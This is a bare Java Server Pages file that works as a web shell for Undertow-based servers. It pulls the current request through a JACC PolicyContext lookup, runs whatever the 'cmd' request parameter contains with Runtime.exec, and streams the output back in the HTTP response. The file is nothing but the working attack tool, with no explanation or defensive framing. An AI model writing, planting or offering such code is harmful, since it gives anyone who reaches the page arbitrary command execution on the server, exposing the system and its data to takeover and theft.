<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    io.undertow.servlet.spec.HttpServletRequestImpl req = (io.undertow.servlet.spec.HttpServletRequestImpl) javax.security.jacc.PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
    String cmd = req.getParameter("cmd");
    if(cmd != null && !cmd.isEmpty()) {
        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
        java.io.OutputStream os = req.getExchange().getOutputStream();

        byte[] bytes = new byte[1024];
        int len = 0;
        while ((len = in.read(bytes)) != -1) {
            os.write(bytes, 0, len);
        }

        os.close();
        in.close();
    }
%>